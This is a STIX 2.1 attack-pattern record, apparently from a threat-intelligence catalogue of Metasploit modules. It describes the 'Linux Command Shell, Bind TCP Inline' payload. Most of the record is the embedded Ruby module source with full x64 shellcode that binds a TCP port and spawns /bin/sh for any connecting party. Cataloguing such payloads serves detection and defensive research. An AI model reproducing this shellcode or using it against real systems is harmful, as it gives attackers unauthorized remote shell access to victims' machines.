{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9dbcafb0-0858-4802-bdc0-6b55876b6938",
    "created": "2024-08-14T16:33:19.46254Z",
    "modified": "2024-08-14T16:33:19.462544Z",
    "name": "Linux Command Shell, Bind TCP Inline",
    "description": "Listen for a connection and spawn a command shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/shell_bind_tcp.rb",
            "external_id": "shell_bind_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 86\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Command Shell, Bind TCP Inline',\n      'Description'   => 'Listen for a connection and spawn a command shell',\n      'Author'        => 'ricky',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::BindTcp,\n      'Session'       => Msf::Sessions::CommandShellUnix,\n      'Payload'       =>\n        {\n          'Offsets' =>\n            {\n              'LPORT' => [ 20, 'n' ],\n            },\n          'Payload' =>\n            \"\\x6a\\x29\"                     + # pushq  $0x29\n            \"\\x58\"                         + # pop    %rax\n            \"\\x99\"                         + # cltd\n            \"\\x6a\\x02\"                     + # pushq  $0x2\n            \"\\x5f\"                         + # pop    %rdi\n            \"\\x6a\\x01\"                     + # pushq  $0x1\n            \"\\x5e\"                         + # pop    %rsi\n            \"\\x0f\\x05\"                     + # syscall\n            \"\\x48\\x97\"                     + # xchg   %rax,%rdi\n            \"\\x52\"                         + # push   %rdx\n            \"\\xc7\\x04\\x24\\x02\\x00\"         + # movl   $0xb3150002,(%rsp)\n            \"\\x15\\xb3\"                     + #\n            \"\\x48\\x89\\xe6\"                 + # mov    %rsp,%rsi\n            \"\\x6a\\x10\"                     + # pushq  $0x10\n            \"\\x5a\"                         + # pop    %rdx\n            \"\\x6a\\x31\"                     + # pushq  $0x31\n            \"\\x58\"                         + # pop    %rax\n            \"\\x0f\\x05\"                     + # syscall\n            \"\\x6a\\x32\"                     + # pushq  $0x32\n            \"\\x58\"                         + # pop    %rax\n            \"\\x0f\\x05\"                     + # syscall\n            \"\\x48\\x31\\xf6\"                 + # xor    %rsi,%rsi\n            \"\\x6a\\x2b\"                     + # pushq  $0x2b\n            \"\\x58\"                         + # pop    %rax\n            \"\\x0f\\x05\"                     + # syscall\n            \"\\x48\\x97\"                     + # xchg   %rax,%rdi\n            \"\\x6a\\x03\"                     + # pushq  $0x3\n            \"\\x5e\"                         + # pop    %rsi\n            \"\\x48\\xff\\xce\"                 + # dec    %rsi\n            \"\\x6a\\x21\"                     + # pushq  $0x21\n            \"\\x58\"                         + # pop    %rax\n            \"\\x0f\\x05\"                     + # syscall\n            \"\\x75\\xf6\"                     + # jne    33 <dup2_loop>\n            \"\\x6a\\x3b\"                     + # pushq  $0x3b\n            \"\\x58\"                         + # pop    %rax\n            \"\\x99\"                         + # cltd\n            \"\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\" + # movabs $0x68732f6e69622f,%rbx\n            \"\\x73\\x68\\x00\"                 + #\n            \"\\x53\"                         + # push   %rbx\n            \"\\x48\\x89\\xe7\"                 + # mov    %rsp,%rdi\n            \"\\x52\"                         + # push   %rdx\n            \"\\x57\"                         + # push   %rdi\n            \"\\x48\\x89\\xe6\"                 + # mov    %rsp,%rsi\n            \"\\x0f\\x05\"                       # syscall\n        }\n      ))\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}